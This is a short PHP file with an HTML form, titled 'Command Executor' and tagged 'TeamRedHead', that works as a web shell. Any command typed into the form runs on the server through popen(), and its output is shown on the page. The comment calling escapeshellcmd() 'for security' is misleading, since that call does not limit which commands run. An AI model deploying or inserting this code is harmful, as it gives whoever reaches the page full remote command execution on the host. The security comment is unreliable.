<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Executor</title>

    <!---- # TeamRedHead --- >
</head>
<body>
    <h2>Execute Command</h2>
    <form action="" method="POST">
        <label for="command">Enter Command:</label>
        <input type="text" id="command" name="command" required>
        <input type="submit" value="Execute">
    </form>
</body>
</html>


<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the command from the user input
    $command = escapeshellcmd($_POST['command']);  // Escaping shell commands for security

    // Execute the command and output the result
    $handle = popen($command, 'r');  // Open a process for reading
    if ($handle) {
        while (!feof($handle)) {
            echo fgets($handle);  // Output the result of the command
        }
        pclose($handle);  // Close the handle
    } else {
        echo "Error executing the command.";
    }
}
?>
